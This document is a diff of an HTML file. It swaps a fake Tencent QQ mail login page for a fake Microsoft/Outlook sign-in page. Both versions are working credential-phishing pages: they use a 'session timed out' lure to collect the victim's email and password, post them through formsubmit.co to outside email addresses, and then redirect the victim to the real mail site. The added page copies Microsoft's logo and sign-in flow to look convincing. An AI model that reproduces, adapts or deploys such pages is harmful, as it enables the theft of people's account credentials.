@@ -3,97 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
-    <title>登入QQ</title>
+    <title>Sign In</title>
     <style>
-        body, html {
-            height: 100%;
-            width: 100%;
-            margin: 0;
+        body {
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            position: relative;
+            height: 100vh;
+            background-color: #f2f2f2;
         }
-        iframe {
-            width: 500%;
-            height: 100%;
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            height: 300px; /* Increased width for the form */
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: black; /*  blue */
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 100%; /* Responsive logo size */
+            max-width: 120px; /* Maximum width for the logo */
+            margin-bottom: 5px; /* Space below the logo */
+        }
+        input[type="email"], input[type="password"] {
+            width: 92%;
+            padding: 10px;
             border: none;
-            position: absolute;
-            top: 0;
-            left: 10%;
-            z-index: 1; /* Ensure iframe is behind the form */
-        }
-        .form-container {
-            position: relative;
-            z-index: 2; /* Ensure form is above the iframe */
-            padding: 20px;
-            border: 2px solid #ccc;
-            width: 25%;
-            height: 70%;
-            margin-top: 100px;
-            margin-bottom: 100px;
-            margin-right: px;
-            margin-left: 25px;
-            background-color: white; /* Semi-transparent background */
-            border-radius: 8px;
+            border-bottom: 2px solid gray; /* Bottom border color */
+            outline: none; /* Remove outline */
+            margin-top: px; 
+            margin-bottom: px; /* Space between inputs */
+         }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border-bottom-color: #0072c6;
         }
         
-        img {
-
-width: 170px;
-
-height: 50px;
-
-}
-        input[type="email"] {
-            width: 90%;
+         .forgot-password {
+            display: block;
+            margin-top: -120px; /* Adjust spacing above link */
+            margin-bottom: -42px; /* Space below link */
+            color: #0072c6; /*  blue for link */
+            font-size: 12px;
+            text-decoration: none; /* Remove underline from link */
+        }
+        
+         .create-account {
+            display: block;
+            
+            margin-bottom: 20px; /* Space below link */
+            color: #0072c6; /* blue for link */
+            font-size: 11px;
+            text-decoration: none; /* Remove underline from link */
+        }
+        button {
+            width: 30%;
             padding: 10px;
-            margin: 50px 0;
+            background-color: #0072c6; /* Button color */
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 90px;
+            margin-bottom: 70px;
+            margin-left: 222px;
+        }
+        button:hover {
+            background-color: #005ea6;
+        }
+        #emailDisplay {
             margin-bottom: 10px;
-            margin-left: 5px;
-          }  
-        input[type="password"] {
-            width: 90%;
-            padding: 10px;
-            margin: 0px 0;
-            margin-bottom: 40px;
-            margin-left: 5px;
+            font-weight: bold;
         }
-        input[type="submit"] {
-background-color: #4d9bcb; /* navy Blue */
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin-left: 5px;
-            padding: 15px;
-            width: 97%;
-            height: 10%;
-        }
+        h3 {
+           
+            margin-bottom: 5px;
+            font-size: 11px;
+            color: red; /* blue */
+            }
     </style>
 </head>
-<body>
-    <iframe src="" title="Embedded Website"></iframe>
-    <div class="form-container">
+<body>   
+    <div class="container">
+        <img src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Logo" class="logo">
        
-            <img src="data:image/png;base64,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" alt="Your Logo" />
-           <center><br> <br> <br>  <label for="email"><font color="red"> mail.qq.com 超時！</font>登入QQ信箱</label></center>
-           <form action="https://formsubmit.co/bjournmarketingcoltd@gmail.com" method="post" >
-           
-           <input type="email" id="email" placeholder="QQ/信箱/手機" name="email" required></br>
-            
-            
-            <input type="password" id="password" placeholder="QQ密碼" name="password" required>
-            <input type="hidden" name="_next" value="https://mail.qq.com">
-               <input type="hidden" name="_captcha" value="false">
-            <input type="submit" value="登入">
-        </form><br> <br> <br><small> ©1998 - 2025 Tencent Inc. All Rights Reserved.
-</small></center><br> <br> <br>
+ <form action="https://formsubmit.co/j.donaldson@bluemarble.net" method="POST">
+
+ 
+     
+        <div id="emailContainer"><h2>Sign in</h2>
+            <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
+            <h3>Session time out!</h3>
+            <button onclick="showPassword()">Next</button>
+        </div>
+        <div id="passwordContainer" style="display: none;"><h2>Enter password</h2>
+            <div id="emailDisplay"></div>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_blacklist" value="spammy pattern, banned term, phrase">
+            <input type="hidden" name="_next" value="https://mail.outlook.com">
+            <button onclick="signIn()">Sign in</button>
+        </div></form>
+       <a href="#" class="forgot-password">Can'taccess your account?</a> <!-- Forgot password link -->
+    
+
+ <div>
+
+       <a href="#" class="create-account"><font-color="black"</font>No account? Create one!</a> <!-- Create account link -->
     </div>
+
+    <script>
+        function showPassword() {
+            var email = document.getElementById('email').value;
+            document.getElementById('emailContainer').style.display = 'none';
+            document.getElementById('passwordContainer').style.display = 'block';
+            document.getElementById('emailDisplay').textContent = email;
+            document.getElementById('password').focus();
+        }
+
+
+    </script>
 </body>
 </html>
